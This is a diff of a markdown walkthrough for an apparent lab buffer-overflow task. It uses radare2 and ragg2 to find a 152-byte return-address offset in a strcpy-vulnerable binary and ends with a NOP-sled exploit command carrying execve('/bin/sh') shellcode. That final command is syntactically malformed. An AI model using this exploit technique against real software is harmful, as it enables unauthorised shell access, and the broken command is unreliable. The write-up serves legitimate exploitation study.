@@ -1219,42 +1219,57 @@ We can use a pattern of 200 bytes to make sure we get something we can trace.
 
 ![Pattern Geenration](assets/buffer-overflow-16-task8-5.png)  
 
-Since we are already using radare2, we can use the simpler regg2: `:> ragg2 -P 200 -r -o pattern.txt`
+Since we are already using radare2, we can use the simpler ragg2: `:> ragg2 -P 200 -r -o pattern.txt`
 
-![Different Pattern Geenration](assets/buffer-overflow-17-task8-6.png)  
+![Different Pattern Geenration](assets/buffer-overflow-17-task8-6a.png)  
 
 This gives us a string of four-byte characters that are still random within the overall string. This will allow us to trace the offset where the overflow happens.
 
 #### Crash and Debug  
 
-`:> r2 -d ./buffer-overflow`
+It is unnecessary to actually generate the test pattern. Instead, we simply run radare2 with the ragg2 commad as argv[1]
 
-First set up the analysis with `aaaa`  
-Search for the known vunlnerable function `s sym.copy_arg`.  
-Print the Disassmbly of the Function with `pdf`
+`:> r2 -d ./buffer-overflow $(ragg2 -P 200)`  
 
-**Run The Pattern:** `:> ood $(cat pattern.txt)` to cause the crash
+We also have to continue the debug once: `dc`
 
-Set two breakpoints  
-`db 0x00400528` <- will provide the original, uncorrupted buffer address assigned to 'rbp - 0x90' (var_90h)
-`db 0x00400563` <- Stops just at 'ret' allowing us to see the stored values
+And dump the registers `dr`
 
-![breakpoints](assets/buffer-overflow-18-task8-7.png)
-
-"continue" the program: `dc`
-inspect rbp to identify the uncorrupted memory address rbp: `dr rbp`
-
-![buffer](assets/buffer-overflow-19-task8-8.png)
-
-As seen early, the buffer is assigned to variables var_90h which is initiated at rbp-0x90.
-
-A [Hex Calculator](https://www.calculator.net/hex-calculator.html) will help with this.
-
-Buffer address = 0x7fffffffe2a0 - 0x90 = 0x7fffffffe210
-
-![hex math](assets/buffer-overflow-20-task8-9.png)
-
-The buffer starts at: 0x7fffffffe210
+```md
+[user1@ip-10-201-104-26 overflow-3]$ r2 -d ./buffer-overflow $(ragg2 -P 200 -r)
+Process with PID 12766 started...
+= attach 12766 12766
+bin.baddr 0x00400000
+Using 0x400000
+asm.bits 64
+ -- No fix, no sleep
+[0x7ffff7dd9ef0]> dc
+Here's a program that echo's out your input
+AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFA
+child stopped with signal 11
+[+] SIGNAL 11 errno=0 addr=0x00000000 code=128 ret=0
+[0x00400563]> dr
+rax = 0x000000c9
+rbx = 0x00000000
+rcx = 0x7ffff7b0d584
+rdx = 0x7ffff7dd58c0
+r8 = 0x4641414541414441 ;<- Compromised register
+r9 = 0x4141484141474141 ;<- Compromised register
+r10 = 0x414b41414a414149 ;<- Compromised register
+r11 = 0x00000246
+r12 = 0x00400450
+r13 = 0x7fffffffe3b0
+r14 = 0x00000000
+r15 = 0x00000000
+rsi = 0x00602260
+rdi = 0x00000000
+rsp = 0x7fffffffe2b8
+rbp = 0x4179414178414177 ;<- Compromised register
+rip = 0x00400563
+rflags = 0x00010206
+orax = 0xffffffffffffffff
+[0x00400563]> 
+```
 
 For use in the eventual exploit, this must be in little-endian: \x10\xe2\xff\xff\xff\x7f\x00\x00
 
@@ -1287,45 +1302,53 @@ rflags = 0x00000206
 orax = 0xffffffffffffffff
 
 ```
+We can find the exact offset by querying the pattern at `rbp`: `ragg2 -q 0x4179414178414177  
 
-We know `ret` will cause the program to jump to `rsp`. The value of `rsp` is the next item to question: `px 16 @ rsp`
+```md
+[0x00400563]> ragg2 -q 0x4179414178414177
+Little endian: 144
+Big endian: -1
+[0x00400563]>
+```
+`rbp` is 8 bytes, which takes us to 151.  
+the Saved Return Address, then, begins at 152 bytes.  
 
-![rsp](assets/buffer-overflow-24-task8-14.png)
-
-`rsp` contains `AzAA1AA2AA3AA4AA`  
-
-There are now three pieces of valuable information:  
-
-- Part of the exploit payload: \x10\xe2\xff\xff\xff\x7f\x00\x00
-- Saved rbp contains: "wAxAwAy"
-- Return address contains: "AzAA1AA2"
-
-Controlling the `ret`urn address, we must accurately identify the offset. That means identifying how many bytes are in the pattern before the pattern currently contained in `ret`.
-
-two available options are:
-
-`:> echo -n "$(cat pattern.txt)" | grep -b -o "AzAA1AA2"` 
-![option 1](assets/buffer-overflow-25-task8-15.png)
-
-`:> echo -n "$(cat pattern.txt'" | awk '{print index($0, "AzAA1AA2")-1}'`  
-
-![option 2](assets/buffer-overflow-26-task8-16.png)
-
-What we know now:
-
-- It took 144 bytes to crash the program
-- Bytes 144-151 overwrites some other date, like `rbp`
-- `ret` begins at 152 bytes
-- Butes 152-159 overwrite the return address  
+ 
 
 #### Exploit 
 
-The exploit works, as previously stated, by placing the shellcode into the buffer and inserting the memory address of the buffer start point into `ret`. Between `buffer` and `ret` we use NOPS.
+Since the compromised return address must be within the NOP sled, we need to identify the runtime address of the buffer.
 
-Building the shellcode starts with a minimum requirement: ```bash execve("/bin/bash", argv, envp)```
+```md
+[0x00400527]> s sym.copy_arg
+[0x00400527]> pdf
+61: sym.copy_arg (int64_t arg1);
+           ; var int64_t var_98h @ rbp-0x98
+           ; var int64_t var_90h @ rbp-0x90
+           ; arg int64_t arg1 @ rdi
+           ; CALL XREF from main @ 0x40058b
+           0x00400527      55             push rbp
+           0x00400528      4889e5         mov rbp, rsp
+           0x0040052b      4881eca00000.  sub rsp, 0xa0
+           0x00400532      4889bd68ffff.  mov qword [var_98h], rdi    ; arg1
+           0x00400539      488b9568ffff.  mov rdx, qword [var_98h]
+           0x00400540      488d8570ffff.  lea rax, [var_90h]
+           0x00400547      4889d6         mov rsi, rdx
+           0x0040054a      4889c7         mov rdi, rax
+           0x0040054d      e8defeffff     call sym.imp.strcpy         ; char *strcpy(char *dest, const char *src)
+           0x00400552      488d8570ffff.  lea rax, [var_90h]
+           0x00400559      4889c7         mov rdi, rax
+           0x0040055c      e8dffeffff     call sym.imp.puts           ; int puts(const char *s)
+           0x00400561      90             nop
+           0x00400562      c9             leave
+           ;-- rip:
+           0x00400563      c3             ret
+[0x00400527]> 
 
-Of course, the first argument needs to be a shell already on the system being compromised.  
+```
 
-The simplest is to set the second and third arguements to NULL: ```bash execve("/bin/bash", NULL, NULL)```
 
-The objective of this task is to read the secret.txt file. That could be automated with ```bash execve("/bin/bash", ["/bin/bash", "-c", "cat secret.txt"], NULL)```
+
+`:> ./buffer-overflow $(python -c print( ()'\x90' * 121) + '\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05' + [8-byte compromised return address within the NOPs])`
+
+
